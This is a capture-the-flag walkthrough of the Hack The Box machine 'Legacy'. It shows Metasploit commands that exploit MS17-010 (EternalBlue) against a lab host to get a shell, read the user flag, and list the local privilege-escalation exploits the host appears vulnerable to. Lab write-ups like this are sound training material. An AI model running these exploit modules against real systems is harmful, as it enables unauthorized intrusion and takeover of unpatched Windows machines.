# Legacy
## Exploiting Legacy using Eternal Blue | The easy way
* Payload exploit/windows/smb/ms17_010_psexec
* Injecting malicious payload to remote system using outdated vulnerabilities

> There are many ways of doing this machine, but I decided to do this the Eternal Blue way.

Lets get started. Let's first start msfconsole and get us a shell.
```
use windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.4
run
```
*Boom, Magic*
Now we have ourselves access to the remote system.

Lets get the user.txt flag now.
```
shell
dir user.txt /s /p
>  C:\Documents and Settings\john\Desktop\user.txt
```
*User.txt is now ours.*
Now, lets do a quick privesc and getourselves the root flag.
```
use multi/recon/local_exploit_suggester
set SESSION 1
run
```
> Soon you will be granted by a lot of exploits for this old machine
```
[+] 10.10.10.4 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.4 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.4 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.4 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.4 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.4 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.4 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.4 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
> You don't even need to choose one, since you already are the admin.
